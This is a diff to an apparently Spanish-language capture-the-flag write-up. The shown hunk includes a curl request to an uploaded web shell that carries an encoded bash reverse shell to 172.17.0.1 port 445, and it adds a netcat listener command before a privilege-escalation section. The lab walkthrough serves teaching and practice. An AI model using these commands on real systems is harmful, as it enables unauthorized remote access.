@@ -164,6 +164,10 @@ pero hay que encodearlo para que de menos problemas y hacemos la peticion con cu
 ```bash
 curl "http://crosswords.5eek3r.dl/shell.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%27"
 ```
+y ponerse a la escucha en el 445:
+```bash
+sudo nc -nvlp 445
+```
 Por fin estamos dentro.
 
 ## ESCALADA DE PRIVILEGIOS
